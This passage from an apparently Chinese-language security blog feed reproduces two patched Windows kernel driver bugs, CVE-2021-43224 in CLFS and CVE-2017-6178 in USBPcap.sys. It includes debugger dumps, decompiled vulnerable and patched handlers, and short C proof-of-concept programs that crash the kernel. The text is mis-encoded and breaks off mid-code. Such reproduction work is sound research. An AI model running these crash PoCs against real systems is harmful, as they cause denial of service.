class="hljs-number">00000000</span>`<span class="hljs-number">00000000</span>fffff986`f<span class="hljs-number">0d95590</span>  <span class="hljs-number">00000000</span>`<span class="hljs-number">00000000</span> <span class="hljs-number">00000000</span>`<span class="hljs-number">00000000</span>fffff986`f<span class="hljs-number">0d955a0</span>  <span class="hljs-number">00000000</span>`<span class="hljs-number">00000000</span> <span class="hljs-number">00000000</span>`<span class="hljs-number">00000000</span>fffff986`f<span class="hljs-number">0d955b0</span>  <span class="hljs-number">00000000</span>`<span class="hljs-number">00000000</span> <span class="hljs-number">00000000</span>`<span class="hljs-number">00000000</span>fffff986`f<span class="hljs-number">0d955c0</span>  <span class="hljs-number">00000000</span>`<span class="hljs-number">00000000</span> <span class="hljs-number">00000000</span>`<span class="hljs-number">00000000</span>fffff986`f<span class="hljs-number">0d955d0</span>  <span class="hljs-number">00000000</span>`<span class="hljs-number">00000000</span> <span class="hljs-number">00000000</span>`<span class="hljs-number">00000000</span>fffff986`f<span class="hljs-number">0d955e0</span>  <span class="hljs-number">00000000</span>`<span class="hljs-number">00000000</span> <span class="hljs-number">00000000</span>`<span class="hljs-number">00000000</span>fffff986`f<span class="hljs-number">0d955f0</span>  <span class="hljs-number">00000000</span>`<span class="hljs-number">00000000</span> <span class="hljs-number">00000000</span>`<span class="hljs-number">00000000</span>fffff986`f<span class="hljs-number">0d95600</span>  <span class="hljs-number">00000000</span>`<span class="hljs-number">00000001</span> fffff807`<span class="hljs-number">048e3b07</span>fffff986`f<span class="hljs-number">0d95610</span>  ffff8687`<span class="hljs-number">0795</span>ba<span class="hljs-number">58 00000000</span>`<span class="hljs-number">00000000</span>fffff986`f<span class="hljs-number">0d95620</span>  <span class="hljs-number">00000000</span>`<span class="hljs-number">00000000</span> <span class="hljs-number">00000000</span>`<span class="hljs-number">00000002</span>fffff986`f<span class="hljs-number">0d95630</span>  <span class="hljs-number">00000000</span>`<span class="hljs-number">00000000</span> fffff807`<span class="hljs-number">0575907</span>cfffff986`f<span class="hljs-number">0d95640</span>  <span class="hljs-number">00000000</span>`<span class="hljs-number">00000010</span> <span class="hljs-number">00000000</span>`<span class="hljs-number">00040301</span>fffff986`f<span class="hljs-number">0d95650</span>  fffff986`f<span class="hljs-number">0d95660</span> <span class="hljs-number">00000000</span>`<span class="hljs-number">00000018</span>fffff986`f<span class="hljs-number">0d95660</span>  ffff8687`<span class="hljs-number">047d1c01</span> ffff86<span class="hljs-number">87`06b70c70</span>   &lt;= ffff8687`<span class="hljs-number">047d1c01</span> canaryfffff986`f<span class="hljs-number">0d95670</span>  <span class="hljs-number">00000000</span>`<span class="hljs-number">00000001</span> <span class="hljs-number">00000000</span>`<span class="hljs-number">00000000</span>fffff986`f<span class="hljs-number">0d95680</span>  ffff86<span class="hljs-number">87`02f39a80</span> ffff86<span class="hljs-number">87`06b70b00</span>fffff986`f<span class="hljs-number">0d95690</span>  <span class="hljs-number">00000000</span>`<span class="hljs-number">00000000</span> fffff807`<span class="hljs-number">057817</span>fd   &lt;= fffff807`<span class="hljs-number">057817</span>fd ret addrfffff986`f<span class="hljs-number">0d956a0</span>  <span class="hljs-number">00000000</span>`<span class="hljs-number">00000002</span> ffff86<span class="hljs-number">87`06b70b00</span>fffff986`f<span class="hljs-number">0d956b0</span>  ffff86<span class="hljs-number">87`02f39a80</span> <span class="hljs-number">00000000</span>`<span class="hljs-number">00000000</span>fffff986`f<span class="hljs-number">0d956c0</span>  <span class="hljs-number">00000000</span>`<span class="hljs-number">00000004</span> ffff8687`<span class="hljs-number">02</span>ca08c0fffff986`f<span class="hljs-number">0d956d0</span>  fffff986`f<span class="hljs-number">0d95738</span> <span class="hljs-number">00000000</span>`<span class="hljs-number">00000160</span>fffff986`f<span class="hljs-number">0d956e0</span>  <span class="hljs-number">00000000</span>`<span class="hljs-number">00000001</span> ffff8687`<span class="hljs-number">02</span>ca08c8</code></pre><p>è°ƒç”¨<code>CClfsLogFcbPhysical::QueryLogFileInfo</code>ä¹‹åçš„<code>CClfsLogFcbVirtual::QueryLogFileInfo</code>çš„æ ˆå¸§å¦‚ä¸‹ï¼Œå…¶<code>canary</code>å’Œ<code>ret addr</code>éƒ½è¢«è¦†ç›–äº†</p><pre><code class="hljs apache"><span class="hljs-attribute">after</span> call CClfsLogFcbPhysical::QueryLogFileInfo<span class="hljs-attribute">1</span>: kd&gt; dq fffff<span class="hljs-number">986</span>`f<span class="hljs-number">0</span>d<span class="hljs-number">955</span>d<span class="hljs-number">0</span> fffff<span class="hljs-number">986</span>`f<span class="hljs-number">0</span>d<span class="hljs-number">955</span>d<span class="hljs-number">0</span>+<span class="hljs-number">0</span>x<span class="hljs-number">118</span><span class="hljs-attribute">fffff986</span>`f<span class="hljs-number">0</span>d<span class="hljs-number">955</span>d<span class="hljs-number">0</span>  <span class="hljs-number">00000000</span>`<span class="hljs-number">00000000</span> <span class="hljs-number">00000000</span>`<span class="hljs-number">00000000</span><span class="hljs-attribute">fffff986</span>`f<span class="hljs-number">0</span>d<span class="hljs-number">955</span>e<span class="hljs-number">0</span>  <span class="hljs-number">00000000</span>`<span class="hljs-number">00000000</span> <span class="hljs-number">00000000</span>`<span class="hljs-number">00010000</span><span class="hljs-attribute">fffff986</span>`f<span class="hljs-number">0</span>d<span class="hljs-number">955</span>f<span class="hljs-number">0</span>  <span class="hljs-number">00000000</span>`<span class="hljs-number">00000000</span> <span class="hljs-number">00000000</span>`<span class="hljs-number">00000000</span><span class="hljs-attribute">fffff986</span>`f<span class="hljs-number">0</span>d<span class="hljs-number">95600</span>  <span class="hljs-number">00000000</span>`<span class="hljs-number">00000002</span> <span class="hljs-number">00000200</span>`<span class="hljs-number">00009</span>c<span class="hljs-number">40</span><span class="hljs-attribute">fffff986</span>`f<span class="hljs-number">0</span>d<span class="hljs-number">95610</span>  <span class="hljs-number">00000000</span>`<span class="hljs-number">00000000</span> <span class="hljs-number">00000000</span>`<span class="hljs-number">00000000</span><span class="hljs-attribute">fffff986</span>`f<span class="hljs-number">0</span>d<span class="hljs-number">95620</span>  <span class="hljs-number">00000000</span>`<span class="hljs-number">00000000</span> <span class="hljs-number">00000000</span>`<span class="hljs-number">00000000</span><span class="hljs-attribute">fffff986</span>`f<span class="hljs-number">0</span>d<span class="hljs-number">95630</span>  ffffffff`<span class="hljs-number">00000000</span> <span class="hljs-number">11</span>ed<span class="hljs-number">2</span>ea<span class="hljs-number">7</span>`<span class="hljs-number">221</span>ace<span class="hljs-number">71</span><span class="hljs-attribute">fffff986</span>`f<span class="hljs-number">0</span>d<span class="hljs-number">95640</span>  a<span class="hljs-number">32</span>f<span class="hljs-number">0</span>e<span class="hljs-number">59</span>`<span class="hljs-number">6</span>c<span class="hljs-number">04</span>c<span class="hljs-number">9</span>a<span class="hljs-number">3</span> <span class="hljs-number">00000000</span>`<span class="hljs-number">00000000</span><span class="hljs-attribute">fffff986</span>`f<span class="hljs-number">0</span>d<span class="hljs-number">95650</span>  <span class="hljs-number">00000000</span>`<span class="hljs-number">00000000</span> <span class="hljs-number">00000000</span>`<span class="hljs-number">00000000</span><span class="hljs-attribute">fffff986</span>`f<span class="hljs-number">0</span>d<span class="hljs-number">95660</span>  <span class="hljs-number">00000000</span>`<span class="hljs-number">00000000</span> <span class="hljs-number">00000000</span>`<span class="hljs-number">00000000</span><span class="hljs-attribute">fffff986</span>`f<span class="hljs-number">0</span>d<span class="hljs-number">95670</span>  <span class="hljs-number">00000000</span>`<span class="hljs-number">00000000</span> <span class="hljs-number">00000000</span>`<span class="hljs-number">00000000</span><span class="hljs-attribute">fffff986</span>`f<span class="hljs-number">0</span>d<span class="hljs-number">95680</span>  <span class="hljs-number">00000000</span>`<span class="hljs-number">00000000</span> <span class="hljs-number">00000000</span>`<span class="hljs-number">00000000</span><span class="hljs-attribute">fffff986</span>`f<span class="hljs-number">0</span>d<span class="hljs-number">95690</span>  <span class="hljs-number">00000000</span>`<span class="hljs-number">00000000</span> <span class="hljs-number">00000000</span>`<span class="hljs-number">00000000</span><span class="hljs-attribute">fffff986</span>`f<span class="hljs-number">0</span>d<span class="hljs-number">956</span>a<span class="hljs-number">0</span>  <span class="hljs-number">00000000</span>`<span class="hljs-number">00000000</span> <span class="hljs-number">00000000</span>`<span class="hljs-number">00000000</span><span class="hljs-attribute">fffff986</span>`f<span class="hljs-number">0</span>d<span class="hljs-number">956</span>b<span class="hljs-number">0</span>  <span class="hljs-number">00000000</span>`<span class="hljs-number">00000000</span> <span class="hljs-number">00000000</span>`<span class="hljs-number">00000000</span><span class="hljs-attribute">fffff986</span>`f<span class="hljs-number">0</span>d<span class="hljs-number">956</span>c<span class="hljs-number">0</span>  <span class="hljs-number">00000000</span>`<span class="hljs-number">00000000</span> <span class="hljs-number">00000000</span>`<span class="hljs-number">00000000</span><span class="hljs-attribute">fffff986</span>`f<span class="hljs-number">0</span>d<span class="hljs-number">956</span>d<span class="hljs-number">0</span>  <span class="hljs-number">00000000</span>`<span class="hljs-number">00000000</span> <span class="hljs-number">00000000</span>`<span class="hljs-number">00000000</span><span class="hljs-attribute">fffff986</span>`f<span class="hljs-number">0</span>d<span class="hljs-number">956</span>e<span class="hljs-number">0</span>  <span class="hljs-number">00000000</span>`<span class="hljs-number">00000001</span> ffff<span class="hljs-number">8687</span>`<span class="hljs-number">02</span>ca<span class="hljs-number">08</span>c<span class="hljs-number">8</span></code></pre><h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><p>æˆ‘ç›´æ¥ç”¨çš„è¿™ä¸ª<a href="https://github.com/KaLendsi/CVE-2021-43224-POC">POC</a>ï¼Œæ‰€ä»¥ä¸Šè¿°è°ƒè¯•çš„æ—¶å€™ï¼Œ<code>0x110</code>å°±æ˜¯æ¥è‡ªäºæ­¤ï¼Œåˆšå¥½å¯ä»¥è¦†ç›–åˆ°è¿”å›å€¼</p><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;Windows.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;wchar.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;iostream&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;clfsw32.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;Clfsmgmtw32.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(lib, <span class="hljs-meta-string">&quot;clfsw32.lib&quot;</span>)</span><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<span class="hljs-keyword">wchar_t</span> szLogPath[] = <span class="hljs-string">L&quot;LOG:C:\\Users\\Public\\MyLog::Stream1&quot;</span>;<span class="hljs-comment">//wchar_t szLogPath[] = L&quot;??\\LOG:\\HarddiskVolume0\\MyLog&quot;;</span><span class="hljs-comment">//wchar_t szLogPath[] = L&quot;LOG:\\\\?\\GLOBALROOT\\Device\\HarddiskVolume0\\Users\\Public\\MysssLog&quot;;</span><span class="hljs-comment">//\\\\?\\GLOBALROOT\\Device\\HarddiskVolume0</span><span class="hljs-comment">//SECURITY_ATTRIBUTES psaLogFile = &#123;&#125;;</span>HANDLE   hLog = CreateLogFile(szLogPath, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ, <span class="hljs-literal">NULL</span>, OPEN_ALWAYS, <span class="hljs-literal">NULL</span>);<span class="hljs-keyword">if</span> (INVALID_HANDLE_VALUE == hLog)&#123;<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;error=%d\n&quot;</span>, GetLastError());<span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;&#125;<span class="hljs-keyword">if</span> (!RegisterManageableLogClient(hLog, <span class="hljs-number">0</span>))<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;error=%d\n&quot;</span>, GetLastError());<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;hLog=%p\n&quot;</span>, hLog);CLFS_INFORMATION pinfoBuffer = &#123;&#125;;<span class="hljs-comment">//ULONG infoSize = sizeof(pinfoBuffer);</span>ULONG infoSize = <span class="hljs-number">0x110</span>;system(<span class="hljs-string">&quot;pause&quot;</span>);DWORD dwRet = GetLogFileInformation(hLog, &amp;pinfoBuffer, &amp;infoSize);<span class="hljs-keyword">if</span> (dwRet == <span class="hljs-literal">NULL</span>)&#123;<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;error=%d\n&quot;</span>, GetLastError());<span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;&#125;<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;dwRet=%08x\n&quot;</span>, dwRet);<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;&#125;</code></pre><h2 id="patch"><a href="#patch" class="headerlink" title="patch"></a>patch</h2><p>æˆ‘åˆ†æ<code>patch</code>çš„æ—¶å€™ï¼Œæ˜¯ç›´æ¥ç”¨çš„<code>2021.09.18</code>ã€<code>2021.11.16</code>çš„<code>clfs.sys</code>ï¼Œå¯èƒ½å› ä¸ºæ˜¯<code>win8.1</code>çš„ï¼Œæ‰€ä»¥æ²¡<code>pdb</code>ï¼Œç›´æ¥é˜²æ­¢è¾“å…¥çš„å¤§å°å¤§äº<code>0x78</code></p><p><img src="/img/CVE-2021-43224/patch.png" alt="patch"></p><h2 id="è¯¥POCçš„æ•´ä¸ªæµç¨‹"><a href="#è¯¥POCçš„æ•´ä¸ªæµç¨‹" class="headerlink" title="è¯¥POCçš„æ•´ä¸ªæµç¨‹"></a>è¯¥POCçš„æ•´ä¸ªæµç¨‹</h2><p>åç»­ï¼Œçœ‹äº†ä¸€ä¸‹ï¼Œç”¨æˆ·æ€çš„æ¥å£æ˜¯å¦‚ä½•å’Œå†…æ ¸æ€çš„é©±åŠ¨è°ƒç”¨è”ç³»ä¸Šçš„</p><pre><code class="hljs erlang-repl">clfsw32!CreateLogFile -&gt; ntdll!NtCreateFileclfsw32!RegisterManageableLogClient -&gt; KERNELBASE!DeviceIoControl -&gt; ntdll!NtDeviceIoControlFileclfsw32!GetLogFileInformation -&gt; KERNELBASE!DeviceIoControl -&gt; ntdll!NtDeviceIoControlFile</code></pre><h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><p>æ•´ä¸ªæ¼æ´ä¸æ˜¯å¾ˆå¤æ‚ï¼Œæ¼æ´çš„å±å®³ä¹Ÿåªèƒ½è¾¾åˆ°<code>BSOD</code>ï¼Œä¸ç¡®å®šé—´æ¥è·³è½¬æ˜¯å¦èƒ½è·³è½¬åˆ°å…¶ä»–çš„åœ°æ–¹ï¼Œè¿˜éœ€è¦ç»§ç»­åˆ†æ</p><h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><blockquote><p><a href="https://github.com/KaLendsi/CVE-2021-43224-POC">https://github.com/KaLendsi/CVE-2021-43224-POC</a></p></blockquote>]]></content>
    
    
    <categories>
      
      <category>CVE</category>
      
    </categories>
    
    
    <tags>
      
      <tag>windows kernel</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CVE-2017-6178 æ¼æ´å¤ç°</title>
    <link href="/2022/07/26/CVE-2017-6178%20%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    <url>/2022/07/26/CVE-2017-6178%20%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
    
    <content type="html"><![CDATA[<p>å¤ç°<code>CVE-2017-6178</code>æ—¶ï¼Œè¿˜æ˜¯è¸©äº†å¾ˆå¤šå‘çš„</p><h2 id="ç¯å¢ƒ"><a href="#ç¯å¢ƒ" class="headerlink" title="ç¯å¢ƒ"></a>ç¯å¢ƒ</h2><pre><code class="hljs nsis">è™šæ‹Ÿæœºï¼š<span class="hljs-literal">Win7</span> SP1 x86ç‰©ç†æœºï¼š<span class="hljs-literal">Win10</span>debuggerï¼šwindbg previewcompilerï¼švs2022</code></pre><p>ä¸»è¦ä¸ºäº†è·å–<code>x86</code>çš„<code>USBPcap.sys</code>èŠ±è´¹äº†å¾ˆå¤šæ—¶é—´ï¼Œé¦–å…ˆæ ¹æ®<code>CVE-2017-6178</code>çš„æ¼æ´æè¿°ä»¥åŠ<code>exploit-db</code>çš„è¯´æ˜ï¼Œå¯çŸ¥å…¶å®å¯ä»¥é€šè¿‡å®‰è£…<a href="https://2.na.dl.wireshark.org/win32/all-versions/Wireshark-win32-2.2.5.exe">Wireshark-win32-2.2.5.exe</a>å¾—åˆ°<code>USBPcap.sys</code></p><p>ä½†æ˜¯æˆ‘æœ€åˆçš„æ—¶å€™ï¼Œé€šè¿‡<code>Win7 SP x64</code>å®‰è£…ï¼Œä½†æ˜¯è¿™æ ·å¾—åˆ°çš„æ˜¯<code>x64</code>çš„<code>USBPcap.sys</code>ï¼ˆæˆ‘ä¸ç¡®å®šæ˜¯å¦å­˜åœ¨æ´ï¼Œæœ€ååˆ†æå®Œäº†ä¹‹åçœ‹<code>x64</code>ç‰ˆæœ¬æ˜¯æœ‰çš„ï¼Œå…¶å®<code>github</code>ä¸Š<code>1.0.0.7</code>é‡Œé¢ä¹Ÿæœ‰æ´ï¼Œå¯æ˜¯å½“æ—¶æˆ‘æ²¡ç¿»åˆ°è¿™ä¸ªæ–‡ä»¶ğŸ™ƒï¼‰ï¼Œäºæ˜¯æˆ‘æŠŠ<code>x64</code>ä¸Šå¾—åˆ°çš„<code>USBPcapSetup-1.1.0.0-g794bf26-5.exe</code>æ”¾åˆ°<code>win7 x86</code>ä¸Šè¿›è¡Œå®‰è£…ï¼Œæœ€åå¾—åˆ°äº†<code>x86</code>çš„<code>USBPcap.sys</code>ï¼ˆç›´æ¥æ‹¿32ä½çš„<code>wireshark-2.2.5.exe</code>å®‰è£…ä¹Ÿåº”è¯¥å¯ä»¥ï¼‰</p><p>è¿™ä¸ªæ—¶å€™å°±æŠ¥å‡ºï¼Œéœ€è¦å°†<code>win7</code>æ›´æ–°åˆ°å®‰è£…äº†<code>KB3033929</code>çš„ç‰ˆæœ¬ï¼Œä½†æ˜¯æˆ‘å·²ç»å®‰è£…äº†ï¼Œæœ€ååœ¨<code>USBPcap</code>çš„<code>github</code>ä»“åº“çš„<a href="https://github.com/desowin/usbpcap/issues/31">issue</a>ï¼Œæ‰¾åˆ°äº†ä¸€ä¸ªä¼ªè£…è‡ªå·±å·²ç»å®‰è£…äº†<code>KB3033929</code>çš„æ–¹æ³•</p><p>é€šè¿‡åˆ›å»ºä¸€ä¸ªå†…å®¹ä¸º<code>@echo KB3033929</code>çš„<code>findstr.cmd</code>æ–‡ä»¶ï¼Œæ”¾å…¥<code>c:\windows\system32</code>ç›®å½•ï¼Œå¹¶å°†å…¶ç›®å½•ä¸‹çš„<code>findstr.exe</code>ä¿®æ”¹åå­—ï¼Œä»è€Œå®ç°æŸ¥è¯¢æ—¶ï¼Œè¿”å›å·²å®‰è£…çš„ç»“æœ</p><p>æ³¨ï¼šè¿™ä¸ªåœ°æ–¹ï¼Œéœ€è¦é‡å‘½å<code>findstr.exe</code>çš„æ—¶å€™éœ€è¦ä¿®æ”¹<code>findstr.exe</code>æ–‡ä»¶çš„<code>own</code>å’Œèµ‹äºˆ<code>admin</code>æƒé™ï¼Œå‚è€ƒ<a href="https://blog.csdn.net/zy_strive_2012/article/details/79470829">è¿™ç¯‡åšå®¢</a></p><h2 id="æ¼æ´åˆ†æ"><a href="#æ¼æ´åˆ†æ" class="headerlink" title="æ¼æ´åˆ†æ"></a>æ¼æ´åˆ†æ</h2><p>è¿™ä¸ªæ¼æ´å…¶å®æ¯”è¾ƒç®€å•ï¼Œå°±æ˜¯åœ¨è®¾ç½®<code>dispatchHandler</code>æ—¶ï¼Œå¯¹äº<code>IRP_MJ_FILE_SYSTEM_CONTROL 0x0d</code>ï¼Œè¿™ä¸ª<code>handler</code>ä¸­å¤„ç†å‡ºé”™ï¼ˆæ³¨ï¼š<code>sub_1145A</code>å³<code>IRP_MJ_FILE_SYSTEM_CONTROL</code>çš„<code>handler</code>ï¼‰</p><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">int</span> __stdcall <span class="hljs-title">sub_1145A</span><span class="hljs-params">(<span class="hljs-keyword">int</span> a1, PVOID Tag)</span></span><span class="hljs-function"></span>&#123;  _DEVICE_OBJECT *v2; <span class="hljs-comment">// edi</span>  <span class="hljs-keyword">int</span> v3; <span class="hljs-comment">// eax</span>  _DEVICE_OBJECT *DriverObject; <span class="hljs-comment">// ecx</span>  NTSTATUS v6; <span class="hljs-comment">// edi</span>  _DEVICE_OBJECT **p_AttachedDevice; <span class="hljs-comment">// [esp-Ch] [ebp-18h]</span>  <span class="hljs-keyword">int</span> v8; <span class="hljs-comment">// [esp+14h] [ebp+8h]</span>  v2 = *(_DEVICE_OBJECT **)(a1 + <span class="hljs-number">40</span>);  v3 = IoAcquireRemoveLockEx((PIO_REMOVE_LOCK)&amp;v2-&gt;AttachedDevice, Tag, &amp;File, <span class="hljs-number">1u</span>, <span class="hljs-number">0x18</span>u);  v8 = v3;  <span class="hljs-keyword">if</span> ( v3 &gt;= <span class="hljs-number">0</span> )  &#123;    DriverObject = (_DEVICE_OBJECT *)v2-&gt;DriverObject;    ++*((_BYTE *)Tag + <span class="hljs-number">35</span>);    *((_DWORD *)Tag + <span class="hljs-number">24</span>) += <span class="hljs-number">36</span>;    p_AttachedDevice = &amp;v2-&gt;AttachedDevice;    v6 = IofCallDriver(DriverObject, (PIRP)Tag);<span class="hljs-comment">// vuln</span>    IoReleaseRemoveLockEx((PIO_REMOVE_LOCK)p_AttachedDevice, Tag, <span class="hljs-number">0x18</span>u);    <span class="hljs-keyword">return</span> v6;  &#125;  <span class="hljs-keyword">else</span>  &#123;    sub_11434((PIRP)Tag, v3, <span class="hljs-number">0</span>);    <span class="hljs-keyword">return</span> v8;  &#125;&#125;</code></pre><p>è¿™ä¸ªåœ°æ–¹å¹¶æœªåˆ¤æ–­<code>DriverObject</code>æ˜¯å¦ä¸º<code>NULL</code>ï¼Œè€Œå¯¼è‡´è¿™ä¸ªæœªåˆå§‹åŒ–çš„å€¼ç›´æ¥ä¼ å…¥äº†<code>IofCallDriver</code>ï¼Œä»è€Œå‡ºç°äº†ç©ºæŒ‡é’ˆè§£å¼•ç”¨çš„é”™è¯¯</p><p>æœ€ç»ˆ<code>crash</code>ä½ç½®</p><pre><code class="hljs routeros">Access violation - code c0000005 (!!! second chance !!!)<span class="hljs-attribute">eax</span>=87b91268 <span class="hljs-attribute">ebx</span>=86ff89f0 <span class="hljs-attribute">ecx</span>=0000000d <span class="hljs-attribute">edx</span>=87b911f8 <span class="hljs-attribute">esi</span>=00000000 <span class="hljs-attribute">edi</span>=86ff89e0<span class="hljs-attribute">eip</span>=83e57f7b <span class="hljs-attribute">esp</span>=8a987ac0 <span class="hljs-attribute">ebp</span>=8a987ac8 <span class="hljs-attribute">iopl</span>=0         nv up ei ng nz na po cy<span class="hljs-attribute">cs</span>=0008  <span class="hljs-attribute">ss</span>=0010  <span class="hljs-attribute">ds</span>=0023  <span class="hljs-attribute">es</span>=0023  <span class="hljs-attribute">fs</span>=0030  <span class="hljs-attribute">gs</span>=0000             <span class="hljs-attribute">efl</span>=00010383nt!IofCallDriver+0x57:83e57f7b 8b4608          mov     eax,dword ptr [esi+8] ds:0023:<span class="hljs-attribute">00000008</span>=????????</code></pre><h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><p>å› ä¸ºæ˜¯<code>IRP_MJ_FILE_SYSTEM_CONTROL</code>ï¼Œæ‰€ä»¥è¦ç”¨<code>FILE_DEVICE_FILE_SYSTEM</code>çš„<code>IOCTL</code>æ‰å¯ä»¥</p><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> FILE_DEVICE_FILE_SYSTEM         0x00000009</span><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> FILE_DEVICE_UNKNOWN             0x00000022</span></code></pre><p>æœ€ç»ˆ<code>POC</code>æ˜¯ç›´æ¥ç”¨çš„<a href="https://github.com/k0keoyo/try_exploit/blob/master/_cve_2017_6178_poc/_CVE_2017_6178_PoC.cpp"> k0keoyoå¸ˆå‚…çš„POC </a></p><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;windows.h&gt;</span></span><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span> *argv[])</span></span><span class="hljs-function"></span>&#123;    HANDLE hDevice;    DWORD dwRetBytes = <span class="hljs-number">0</span>;    hDevice = CreateFile(<span class="hljs-string">&quot;\\\\.\\USBPcap1&quot;</span>, <span class="hljs-number">0</span>, FILE_SHARE_READ | FILE_SHARE_WRITE, <span class="hljs-literal">NULL</span>, OPEN_EXISTING, <span class="hljs-number">0</span>, <span class="hljs-literal">NULL</span>);    <span class="hljs-keyword">if</span> (hDevice == INVALID_HANDLE_VALUE)    &#123;        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[-] CreateFile failed (%.08x)\n&quot;</span>, GetLastError());        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;    &#125;    bResult = DeviceIoControl(hDevice, <span class="hljs-number">0x00090000</span>,(LPVOID)<span class="hljs-number">0x1</span>, (DWORD)<span class="hljs-number">0</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>, &amp;dwRetBytes, <span class="hljs-literal">NULL</span>);    <span class="hljs-keyword">if</span> (!bResult)    &#123;        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[-] DeviceIOControl failed (%.08x)\n&quot;</span>,GetLastError());        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;    &#125;    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[+] if show this info ,PoC is failed:(\n\n&quot;</span>);    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;&#125;</code></pre><h2 id="patch"><a href="#patch" class="headerlink" title="patch"></a>patch</h2><p>ä¿®å¤è¿™ä¸ªæ¼æ´ä¹Ÿå¾ˆç®€å•ï¼Œå°±æ˜¯åˆ¤æ–­ä¸€ä¸‹è¿™ä¸ª<code>DriverObject</code>æ˜¯ä¸æ˜¯åˆå§‹åŒ–çš„<code>NULL</code></p><pre><code class="hljs c"><span class="hljs-function">NTSTATUS __stdcall <span class="hljs-title">sub_402038</span><span class="hljs-params">(<span class="hljs-keyword">int</span> a1, PVOID Tag)</span></span><span class="hljs-function"></span>&#123;  _DEVICE_OBJECT *v2; <span class="hljs-comment">// ebx</span>  <span class="hljs-keyword">int</span> v3; <span class="hljs-comment">// eax</span>  NTSTATUS v4; <span class="hljs-comment">// edi</span>  <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">DEVICE_OBJECT</span> *<span class="hljs-title">DriverObject</span>;</span> <span class="hljs-comment">// ecx</span>  v2 = *(_DEVICE_OBJECT **)(a1 + <span class="hljs-number">40</span>);  v3 = IoAcquireRemoveLockEx((PIO_REMOVE_LOCK)&amp;v2-&gt;AttachedDevice, Tag, &amp;File, <span class="hljs-number">1u</span>, <span class="hljs-number">0x18</span>u);  v4 = v3;  <span class="hljs-keyword">if</span> ( v3 &gt;= <span class="hljs-number">0</span> )  &#123;    DriverObject = (struct _DEVICE_OBJECT *)v2-&gt;DriverObject;    <span class="hljs-keyword">if</span> ( DriverObject )    &#123;      ++*((_BYTE *)Tag + <span class="hljs-number">35</span>);      *((_DWORD *)Tag + <span class="hljs-number">24</span>) += <span class="hljs-number">36</span>;      v4 = IofCallDriver(DriverObject, (PIRP)Tag);    &#125;    <span class="hljs-keyword">else</span>    &#123;      v4 = <span class="hljs-number">-1073741808</span>;      sub_40201A((PIRP)Tag, <span class="hljs-number">-1073741808</span>, <span class="hljs-number">0</span>);    &#125;    IoReleaseRemoveLockEx((PIO_REMOVE_LOCK)&amp;v2-&gt;AttachedDevice, Tag, <span class="hljs-number">0x18</span>u);  &#125;  <span class="hljs-keyword">else</span>  &#123;    sub_40201A((PIRP)Tag, v3, <span class="hljs-number">0</span>);  &#125;  <span class="hljs-keyword">return</span> v4;&#125;</code></pre><h2 id="è°ƒè¯•"><a href="#è°ƒè¯•" class="headerlink" title="è°ƒè¯•"></a>è°ƒè¯•</h2><p>è°ƒè¯•è¿™è¾¹è¸©å‘ç‰¹åˆ«å¤šï¼Œæœ€åˆå¯¹<code>DeviceIoControl</code>çš„æµç¨‹ä¸ç†è§£çš„æ—¶å€™ï¼Œä¸‹æ–­ç‚¹çš„æ—¶å€™ï¼Œä¸€ç›´å‚ç…§å…¶ä»–çš„è°ƒè¯•é©±åŠ¨å‡ºé”™æ—¶çš„<code>nt!NtDeviceIoControlFile</code>å‡½æ•°ä¸­ä¸‹æ–­ç‚¹</p><p>æœ€åˆæ˜¯ä»¥ä¸ºæ˜¯ï¼Œè‡ªå·±çš„æ¡ä»¶æ–­ç‚¹ä¸ç†Ÿç»ƒï¼Œä»¥åŠ<code>offset=0</code>æ—¶ï¼Œè¿™ä¸ª<code>ebp</code>è¿˜ä¸æ˜¯åç»­çš„<code>ebp</code>æ‰€ä»¥å‡ºé”™</p><pre><code class="hljs 